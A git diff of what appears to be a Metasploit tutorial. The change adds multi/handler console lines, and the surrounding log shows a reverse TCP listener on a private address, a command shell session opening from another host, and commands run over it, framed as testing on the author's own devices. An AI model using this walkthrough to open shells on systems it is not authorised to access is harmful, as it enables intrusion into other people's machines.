@@ -173,8 +173,6 @@ msf6 exploit(multi/handler) > run
 [*] Started reverse TCP handler on 192.168.0.1:4444
 ```
 
-...
-
 ### Wait or test for connection
 
 You can now wait or just test it yourself (_without payload, of course_).
@@ -199,6 +197,8 @@ On other own device(s) you can establish a reverse shell.
 Yes, 2 sessions were opened ... 
 
 ```shell
+msf6 exploit(multi/handler) > run
+[*] Started reverse TCP handler on 192.168.0.1:4444
 [*] Command shell session 2 opened (192.168.0.1:4444 -> 192.168.0.140:54247) at 2021-04-04 17:54:08 +0100
 ifconfig en0
 en0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500
